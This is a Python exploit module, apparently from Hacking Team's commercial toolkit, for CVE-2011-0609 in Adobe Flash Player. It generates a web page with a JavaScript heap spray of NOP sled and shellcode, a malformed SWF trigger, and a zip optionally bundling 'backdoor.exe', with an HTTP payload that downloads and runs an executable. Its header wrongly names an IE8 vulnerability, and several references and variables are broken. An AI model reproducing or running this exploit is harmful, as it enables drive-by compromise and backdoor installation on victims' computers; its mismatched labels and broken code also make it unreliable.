#! /usr/bin/env python

#Copyright HT srl, 2010
#http://www.hackingteam.it/ for more information

#cod

#
# Microsoft Internet Explorer 8 Uninitialized Memory Corruption Vulnerability (MS09-072 / CVE-2009-3671)
# vupen

import os
import sys
import math
import warnings

if "." not in sys.path: sys.path.append(".")
if "encoders" not in sys.path: sys.path.append("encoders")
if "payloads" not in sys.path: sys.path.append("payloads")

import time
import struct
import random
import zlib
import copy
import zipfile
import base64
import bz2
from random import *

import x86shellodrop
import x86shelldrophttp
import x86int3
import ASCIIHexWhitespace
import x86helloworld
import jscript_unicode

NAME="cve_2011_0609_adobe_flash_player"
DESCRIPTION="Adobe Flash Player AVM Bytecode Verification"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Adobe"
DOCUMENTATION["Repeatability"]="One Shot"
DOCUMENTATION["Date public"] = "2011/03/15"
DOCUMENTATION["CVE Name"] = "CVE-2011-0609"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0609"
DOCUMENTATION["Note"] = """This module exploits a vulnerability in AVM2 action script virtual machine used
in Adobe Flash Player versions 9.0 through 10. The AVM fails to properly verify 
bytecode streams prior to executing it. This can cause uninitialized memory to be 
executed. Utilizing heap spraying techniques to control the uninitialized memory region it is
possible to execute arbitrary code. Typically Flash Player is not used as a 
standalone application. Often, SWF files are embeded in other file formats or 
specifically loaded via a web browser. Malcode was discovered in the wild which 
embeded a malformed SWF file within an Excel spreadsheet. This exploit is based
off the byte stream found within that malcode sample."""

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000","XP", "VISTA", "SEVEN"]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
"""

CHANGELOG="""

"""

DEBUGNOTES="""
"""

class exploit:
	
	infile =""
	outfile =""

	def __init__(self, backdoorPath, zipFile):
		#self.setInfo(DESCRIPTION)
		self.setVersions()
		self.r = Random()
		self.r.seed()
		self.name=NAME
		self.debugmode = dbg
		self.outputCompressed = zipFile
		self.backdoorPath = backdoorPath

	"""
	return a random char from a range
	"""
	def getrandchar(self):
		chars = "q0w1e2r3t4y5u6i7o8p9a_sdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
		i = self.r.randint(0, len(chars)-1)
		return chars[i]

	"""
	return a file name (random dot html (omissis))
	"""
	def randfilename(self):
		newfilename = ""
		
		for i in range(8):
			newfilename += struct.pack('c', self.getrandchar())
				
		return newfilename
	
	def displayVersions(self):
		for v in self.versions.keys():
			print "Version %d: %s"%(v,self.versions[v][0])

	def setVersions(self):
		self.versions={}
		#name, jmp esp, writeloc, writable, shelloc
		#                                    POP/POP/RET
		self.versions[1]=("Adobe Flash Player", 0x04040404)
   
	def createShellcode(self):
		result = None
		
		if payload == 0:
			obj = x86shelldrop.x86shelldrop()
			x = obj.get(self.backdoorPath)
			#result = struct.pack('l', len(x)+4) + x
			result = x
		elif payload == 1:
			obj = x86shelldrophttp.x86shelldrophttp()
			x = obj.get(self.backdoorPath)
			result = x
		elif payload == 2:
			obj = x86helloworld.x86helloworld()
			x = obj.get()
			result = x
			
		if self.debugmode == True:
			obj = x86int3.x86int3()
			result = obj.get() + result
			
		return result

	
	def run(self):
		self.makefile()
				
		return 1
        
	def makefile(self):
		"""Makes the actual bad html file to trigger the buffer overflow"""
		trigger_file = self.randfilename() + ".swf"
		
		adapter = jscript_unicode.jscript_unicode()
		
		nops = struct.pack("l", self.versions[1][1])
		nop_sled = adapter.get(nops)
		
		var_blocks = self.randfilename()
		var_shellcode = self.randfilename()
		var_index = self.randfilename()
		var_nopsled = self.randfilename()
		spray_func = self.randfilename()
		obj_id = self.randfilename()
		
		shellcode = self.createShellcode()
	
		shellcode = adapter.get(shellcode)
		
		html = """<html>
	<head></head>
	<body>
		<script>
		function #{spray_func}() {
			#{var_blocks} = new Array();
			var #{var_shellcode} = unescape(#{shellcode});
			var #{var_nopsled} = unescape("#{nop_sled}");
		do { #{var_nopsled} += #{var_nopsled} } while (#{var_nopsled}.length < 8200);
		for (#{var_index}=0; #{var_index} < 25000; #{var_index}++)
		#{var_blocks}[#{var_index}] = #{var_nopsled} + #{var_shellcode};
		}
		#{spray_func}();
		</script>
		<center>        
			<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" id="#{obj_id}" width="0" height="0" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab">
				<param name="movie" value="#{trigger_file}" />
			</object>
		</center>
	</body>
</html>
	"""
	
		#Replace filename
		html = html.replace("#{trigger_file}", trigger_file)
		html = html.replace("#{spray_func}", spray_func)
		html = html.replace("#{var_blocks}", var_blocks)
		html = html.replace("#{var_shellcode}", var_shellcode)
		html = html.replace("#{shellcode}", '\"' + shellcode + '\"')
		html = html.replace("#{var_nopsled}", var_nopsled)
		html = html.replace("#{nop_sled}", '\"' + nop_sled + '\"')
		html = html.replace("#{var_index}", var_index)
		html = html.replace("#{obj_id}", obj_id)
		
		with warnings.catch_warnings():
			warnings.simplefilter('ignore')
			tmp_doc = os.tempnam()
			tmp_backdoor = os.tempnam()
			
		f = open(tmp_doc,mode='wb')
		f.write(html)
		f.close()
		
		# Create the output archive
		print "Creating %s zip file archive"%(self.outputCompressed)
		zip = zipfile.ZipFile(self.outputCompressed, "w", zipfile.ZIP_DEFLATED)
		
		print "Adding index file"
		zip.write(tmp_doc, "index.html")
		
		print "Adding swf file from resources"
		zip.write("resources/CVE-2011-0609.swf", trigger_file)
		
		if extraPath != None:
			print "Adding copy of backdoor"
			zip.write(extraPath, "backdoor.exe")
		
		zip.close()
		
		try:
			os.unlink(tmp_doc)
		except WindowsError:
			print "I/O error when deleting temp. files"
			
		return 1


if __name__=='__main__':
	dbg = False
	http = False
	
	if len(sys.argv) < 3:
		print "[ERROR] %s require 3 parameters"%(DESCRIPTION)
		print "[-INFO] {payload:[http|local|debug]} [localbackdoor|urltodownload] output"
		sys.exit(0)

	# Parse payload section
	if sys.argv[1].split(':')[0] != "payload":
		print "[ERROR] First parameters must be payload"
		sys.exit(0)
	else:
		requiredpayload = sys.argv[1].split(':')[1]	
		if requiredpayload == "http":
			print "[HTTP] Using HTTP reverse connect to download exe"
			payload = 1
			http = True
			if len(sys.argv) > 3:
				extraPath = sys.argv[4]
			else:
				extraPath = None
				
		elif requiredpayload == "debug":
			print "[DEBUG] Using INT3 exploit mode"
			payload = 0
			dbg = True
		elif requiredpayload == "local":
			print "[LOCAL] Run from %currdir%"
			payload = 2
		else:
			print "[ERROR] Unknown payload defined"
			sys.exit(0)
	
	# Interprete section
	
	if http == False:
		if os.path.isfile(sys.argv[3]) == False:
			print "[ERROR] File %s doesn't exists."%(sys.argv[3])
			sys.exit(0)

		if os.path.getsize(sys.argv[3]) == 0:
			print "[ERROR] File %s has length zero."%(sys.argv[3])
			sys.exit(0)

	#if os.path.isfile("resources/blank.pdf") == False:
	#	print "[ERROR] resources/blank.pdf not found"
	#	sys.exit(0)
	
	print 'Running %s Exploit v %s'%(DESCRIPTION,VERSION)

	app=exploit(sys.argv[2], sys.argv[3])
	app.run()
	
	print ' ... done'